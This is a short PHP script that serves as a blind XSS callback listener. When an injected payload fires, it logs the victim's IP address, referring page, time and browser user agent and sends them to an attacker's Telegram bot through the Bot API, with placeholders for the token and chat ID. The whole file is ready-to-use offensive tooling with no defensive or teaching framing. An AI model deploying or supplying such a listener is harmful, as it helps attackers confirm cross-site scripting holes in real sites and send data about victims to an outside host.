<?php
date_default_timezone_set('Asia/Jakarta');

ob_flush();
header("Content-type:application/json");

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$ip = get_client_ip();
$ref = @$_SERVER['HTTP_REFERER'];
if(empty($ref)){

$ref = '-';

}

$datenow = date('Y-m-d H:i:s');
$ua = @$_SERVER['HTTP_USER_AGENT'];
if(empty($ua)){

$ua = '-';
}
$message = '
Blind XSS Alert!

IP Address: '.$ip.'
Reff URL: '.$ref.'
Hitted: '.$datenow.'

User Agent: '.$ua.'
';

$message = urlencode($message);
$chat_id = "Your Chat ID";
$API_TOKEN = "Your Telegram Token";
file_get_contents("https://api.telegram.org/bot{$API_TOKEN}/sendMessage?text={$message}&chat_id={$chat_id}");

